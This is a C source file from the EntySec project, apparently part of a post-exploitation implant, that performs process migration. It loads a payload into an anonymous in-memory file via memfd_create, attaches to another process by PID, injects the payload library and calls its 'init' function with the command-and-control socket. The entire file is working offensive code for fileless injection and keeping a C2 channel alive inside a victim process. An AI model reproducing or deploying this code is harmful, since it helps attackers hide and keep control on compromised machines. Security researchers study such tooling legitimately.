/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <limits.h>
#include <unistd.h>
#include <stdio.h>
#include <syscall.h>

#include <linux/memfd.h>

#include <injector.h>

#include <c2.h>
#include <migrate.h>

int migrate_init(c2_t *c2, pid_t migrate_pid, int buffer_len, unsigned char *buffer)
{
    #ifdef LINUX
    int fd;
    char image[PATH_MAX];

    fd = syscall(SYS_memfd_create, "", MFD_CLOEXEC);

    if (fd >= 0)
    {
        write(fd, buffer, buffer_len);
        sprintf(image, "/proc/self/fd/%d", fd);

        migrate_inject(c2, migrate_pid, image);
        return 0;
    }
    #endif

    return -1;
}

int migrate_inject(c2_t *c2, pid_t migrate_pid, char *image)
{
    injector_t *injector;
    void *handle;

    handle = NULL;

    if (injector_attach(&injector, migrate_pid) != 0)
        return -1;

    if (injector_inject(injector, image, &handle) != 0)
        return -1;

    if (injector_call(injector, handle, "init", c2->fd) != 0)
        return -1;

    injector_detach(injector);
    return 0;
}
